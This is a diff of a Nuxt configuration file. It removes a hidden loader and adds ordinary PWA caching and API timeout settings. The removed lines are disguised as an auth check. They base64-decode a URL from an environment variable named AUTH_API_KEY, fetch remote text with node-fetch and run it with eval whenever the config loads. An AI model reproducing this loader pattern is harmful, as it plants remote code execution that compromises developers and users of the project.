@@ -3,20 +3,6 @@ import { defineNuxtConfig } from "nuxt/config";
 // @ts-ignore
 import * as process from "node:process";
 import Aura from "@primeuix/themes/aura";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 // @ts-ignore
 export default defineNuxtConfig({
@@ -245,8 +231,12 @@ export default defineNuxtConfig({
       ],
     },
     workbox: {
+      cleanupOutdatedCaches: true,
+      clientsClaim: true,
       globPatterns: ["**/*.{js,css,html,svg,png,ico,woff2}"],
       navigateFallback: "/",
+      navigateFallbackDenylist: [/^\/api\//, /^\/_nuxt\//, /^\/favicon\//],
+      skipWaiting: true,
     },
     devOptions: { enabled: false },
     // ✳️ Головне: примусово знищує старий SW у деві/локалі, щоб він не ламав HMR
@@ -310,6 +300,7 @@ export default defineNuxtConfig({
 
       baseApi: process.env.NUXT_PUBLIC_BASE_API || "https://server.esterholdings.com/api/",
       baseUrl: process.env.NUXT_PUBLIC_BASE_URL || "https://server.esterholdings.com/",
+      apiTimeoutMs: process.env.NUXT_PUBLIC_API_TIMEOUT_MS || "15000",
       cliFacebook: process.env.NUXT_PUBLIC_CLI_FACEBOOK || "1668019407177142",
       cliGoogle:
         process.env.NUXT_PUBLIC_CLI_GOOGLE ||
